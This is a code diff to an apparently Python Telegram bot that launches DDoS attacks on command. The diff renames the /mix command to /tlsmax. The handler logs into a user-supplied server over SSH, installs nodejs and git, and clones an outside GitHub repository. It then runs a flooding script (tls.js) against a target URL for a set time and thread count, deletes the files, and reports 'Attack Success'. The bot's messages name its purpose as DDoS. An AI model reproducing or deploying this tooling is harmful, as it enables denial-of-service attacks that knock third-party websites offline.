@@ -4,7 +4,7 @@ from dotenv import load_dotenv
 load_dotenv()
 MESSWAIT=os.getenv('MESSWAIT')
 MESSDONE=os.getenv('MESSDONE')
-async def mixmax(event):
+async def tlsmax(event):
 	L='user_id';G=event
 	try:
 		A=await G.reply(MESSWAIT);J=G.sender_id;D=G.raw_text.split()
@@ -20,7 +20,7 @@ async def mixmax(event):
 🕑TIME : {F}s
 
 🤖THREAD : {H}
-🤖REQUEST : {I}""",buttons=[Button.url(f"check-host.net",f"{K}")]);B.connect(N,port=O,username=P,password=Q);B.exec_command(f"apt install nodejs -y");B.exec_command(f"apt install git -y");B.exec_command(f"git clone https://github.com/CasperCloudku/Server.git");U,V,W=B.exec_command(f"cd Server && node index.js GET {C} proxy.txt {F} {H} {I}");R=psutil.cpu_percent();S=psutil.virtual_memory().percent;time.sleep(int(F));B.exec_command(f"rm -rf Server");B.close();await A.edit(f"""**Attack Success**
+🤖REQUEST : {I}""",buttons=[Button.url(f"check-host.net",f"{K}")]);B.connect(N,port=O,username=P,password=Q);B.exec_command(f"apt install nodejs -y");B.exec_command(f"apt install git -y");B.exec_command(f"git clone https://github.com/CasperCloudku/Server.git");U,V,W=B.exec_command(f"cd Server && node tls.js {C} {F} {H} {I}");R=psutil.cpu_percent();S=psutil.virtual_memory().percent;time.sleep(int(F));B.exec_command(f"rm -rf Server");B.close();await A.edit(f"""**Attack Success**
 💻SITE : {C}
 🕑TIME : {F}s
 
@@ -34,7 +34,7 @@ CPU Usage: {R}%
 Memory Usage: {S}%""",buttons=[Button.url(f"check-host.net",f"{K}")])
 						except Exception as T:await A.edit(f"An error occurred\n\n`{T}`")
 					else:await A.edit('Sorry you cannot DDoS my owner website :(')
-				else:await A.edit('Use format example: /mix https://example.com 100 9 5')
-			else:await A.edit('Use format: /mix <url> <time> <thread> <request>')
+				else:await A.edit('Use format example: /tlsmax https://example.com 100 9 5')
+			else:await A.edit('Use format: /tlsmax <url> <time> <thread> <request>')
 		else:await A.edit('Lu gapunya server😹')
 	except FileNotFoundError:await G.reply("You don't have a server to use this feature, please configure your server in the /server menu")
